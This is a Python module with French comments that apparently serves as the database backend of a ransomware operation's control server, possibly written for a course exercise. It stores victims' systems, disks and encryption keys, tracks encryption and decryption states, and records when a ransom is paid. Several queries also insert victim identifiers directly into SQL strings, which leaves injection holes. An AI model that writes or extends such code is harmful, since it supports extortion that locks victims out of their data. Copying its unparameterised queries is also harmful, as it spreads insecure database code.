import sqlite3
import time

# Constantes
DB_FILENAME = 'data/victims.sqlite'
DEBUG = False

def connect_db():
    """
    Initialise la connexion vers la base de donnée
    :return: La connexion établie avec la base de donnée
    """
    try:
        conn = sqlite3.connect(DB_FILENAME)
        if DEBUG:
            print(f"[INFO] Connexion à la base de données établie.")
        return conn

    except sqlite3.Error as error:
        if DEBUG:
            print(f"[ERREUR] Échec de connexion à la base de données : {error}")
        return None

def insert_data(conn, table, items, data):
    """
    Insère des données de type 'items' avec les valeurs 'data' dans la 'table' en utilisant la connexion 'conn' existante
    :param conn: la connexion existante vers la base de donnée
    :param table: la table dans laquelle insérer les données
    :param items: le nom des champs à insérer
    :param data: la valeur des champs à insérer
    :return: Néant
    """
    placeholders = ', '.join(['?'] * len(items))
    columns = ', '.join(items)
    query = f"INSERT INTO {table} ({columns}) VALUES ({placeholders})"

    if DEBUG:
        print(f"[DEBUG] Requête SQL: {query}")
        print(f"[DEBUG] Données à insérer: {data}")

    try:
        cursor = conn.cursor()
        cursor.execute(query, data)
        conn.commit()
        cursor.close()

        if DEBUG:
            print(f"[INFO] Insertion réussie dans '{table}'.")

        return True

    except sqlite3.IntegrityError as e:
        if DEBUG:
            print(f"[ERREUR] Violation d'intégrité lors de l'insertion : {e}")
        return False

    except sqlite3.Error as error:
        if DEBUG:
            print(f"[ERREUR] Erreur SQLite lors de l'insertion dans '{table}': {error}")
        return False

def select_data(conn, select_query):
    """
    Exécute un SELECT dans la base de donnée (conn) et retourne les records correspondants
    :param conn: la connexion déjà établie à la base de donnée
    :param select_query: la requête du select à effectuer
    :return: les records correspondants au résultats du SELECT
    """
    try:
        cursor = conn.cursor()
        if DEBUG:
            print(f"[DEBUG] SQL SELECT exécuté : {select_query}")

        cursor.execute(select_query)
        results = cursor.fetchall()
        cursor.close()

        if DEBUG:
            print(f"[INFO] {len(results)} ligne(s) récupérée(s) depuis la base.")

        return results

    except sqlite3.Error as error:
        print(f"[ERREUR] Échec de la requête SELECT : {error}")
        return []

def get_list_victims(conn):
    """
    Retourne la liste des victimes présente dans la base de donnée
    (N'oubliez pas de vous servir de la fonction précédente pour effectuer la requête)
    :param conn: la connexion déjà établie à la base de donnée
    :return: La liste des victimes
    """
    query = '''
            SELECT v.hash, v.OS, v.disks, s.state
            FROM victims v
            LEFT JOIN (
                SELECT hash_victim, state
                FROM states
                WHERE datetime IN (
                    SELECT MAX(datetime)
                    FROM states s2
                    WHERE s2.hash_victim = states.hash_victim
                )
            ) s ON v.hash = s.hash_victim
        '''

    victims = select_data(conn, query)
    victims_list = []

    for victim in victims:
        hash_victim, os, disks, state = victim
        nb_files = 0

        # On vérifie aussi pour l’état DECRYPT
        if state in ('CRYPT', 'PENDING', 'DECRYPT'):
            query_files = f'''
                    SELECT nb_files
                    FROM encrypted
                    WHERE hash_victim = '{hash_victim}'
                      AND datetime = (
                        SELECT MAX(datetime)
                        FROM encrypted
                        WHERE hash_victim = '{hash_victim}'
                    )
                '''
            result = select_data(conn, query_files)
            if result:
                nb_files = int(result[0][0])

        victims_list.append([
            hash_victim,
            os,
            disks,
            state if state else "CRYPT",
            nb_files
        ])

    return victims_list

def get_list_history(conn, id_victim):
    """
    Retourne l'historique correspondant à la victime 'id_victim'
    :param conn: la connexion déjà établie à la base de donnée
    :param id_victim: l'identifiant de la victime
    :return: la liste de son historique
    """
    histories_list = []

    if DEBUG:
        print(f"[DEBUG] Requête des états pour la victime {id_victim}")

    query = '''
            SELECT hash_victim, datetime, state
            FROM states
            WHERE hash_victim = ?
            ORDER BY datetime
        '''
    histories = select_data(conn, query.replace("?", f"'{id_victim}'"))  # Tu as dit ne pas vouloir utiliser params

    for history in histories:
        hash_victim, timestamp, state = history
        nb_files = 0

        if DEBUG:
            print(f"[DEBUG] Traitement de l'état {state} à {timestamp}")

        if state in ('CRYPT', 'PENDING', 'DECRYPT'):
            query_nb = f'''
                    SELECT nb_files
                    FROM encrypted
                    WHERE hash_victim = '{hash_victim}'
                      AND datetime = '{timestamp}'
                '''
            result = select_data(conn, query_nb)

            if DEBUG:
                print(f"[DEBUG] Résultat de la requête nb_files : {result}")

            if result:
                nb_files = int(result[0][0])

        record = [hash_victim, timestamp, state, nb_files]
        histories_list.append(record)

        if DEBUG:
            print(f"[DEBUG] Ajout à l'historique : {record}")

    return histories_list

def change_state_decrypt(conn, hash_victim):
    """
    Enregistre un nouvel état 'DECRYPT' pour une victime donnée, signalant que la rançon a été payée.
    :param conn: Connexion active à la base de données
    :param hash_victim: Identifiant unique (hash) de la victime
    :return: None
    """
    current_time = int(time.time())

    insert_data(conn, 'states', ('hash_victim', 'datetime', 'state'),
                (hash_victim, current_time, 'DECRYPT'))

    if DEBUG:
        print(f"[DEBUG] État 'DECRYPT' ajouté pour la victime {hash_victim[-12:]} à {current_time}")

def check_hash(conn, hash_victim):
    """
    Vérifie si la signature hash de la victime est déjà enregistré en DB
    :param conn:
    :param hash_victim: Signature de la victime
    :return: (list ou None) id_victim et key si trouvé
    """

    query = f'''
            SELECT hash, key
            FROM victims
            WHERE hash = "{hash_victim}"
        '''
    victim = select_data(conn, query)

    if not victim:
        if DEBUG:
            print(f"[DEBUG] Aucune victime trouvée avec le hash : {hash_victim[-12:]}")
        return None

    hash_val, key = victim[0]
    if DEBUG:
        print(f"[DEBUG] Victime trouvée : hash={hash_val[-12:]}, key=****")

    query_state = f'''
            SELECT state
            FROM states
            WHERE hash_victim = "{hash_victim}"
            ORDER BY datetime DESC
            LIMIT 1
        '''
    result = select_data(conn, query_state)
    last_state = result[0][0] if result else 'INITIALIZE'

    if DEBUG:
        print(f"[DEBUG] Dernier état connu : {last_state}")

    return [hash_val, key, last_state]

def new_victim(conn, hash_victim, os_victim, disk_victim, key_victim):
    """
    Enregistre une nouvelle victime dans la base de données.

    :param conn: Connexion active à la base SQLite
    :param hash_victim: Hash unique de la victime
    :param os_victim: Système d'exploitation de la victime
    :param disk_victim: Informations sur les disques
    :param key_victim: Clé de chiffrement générée pour la victime
    :return: None
    """
    data_victim = (os_victim, hash_victim, disk_victim, key_victim)
    insert_data(conn, 'victims', ('OS', 'hash', 'disks', 'key'), data_victim)

    if DEBUG:
        print(f"[DEBUG] Nouvelle victime enregistrée : hash={hash_victim[-12:]}, OS={os_victim}, disques={disk_victim}")

def insert_new_state(conn, hash_victim, datetime_victim, state="CRYPT"):
    """
    Insère un nouvel état pour une victime donnée dans la table 'states'.

    :param conn: Connexion active à la base SQLite
    :param hash_victim: Identifiant unique (hash) de la victime
    :param datetime_victim: Timestamp associé à l’état (int ou str)
    :param state: État à enregistrer (par défaut : 'CRYPT')
    :return: None
    """
    data_state = (hash_victim, datetime_victim, state)
    insert_data(conn, 'states', ('hash_victim', 'datetime', 'state'), data_state)

    if DEBUG:
        print(f"[DEBUG] Nouvel état enregistré : hash={hash_victim[-12:]}, état={state}, datetime={datetime_victim}")
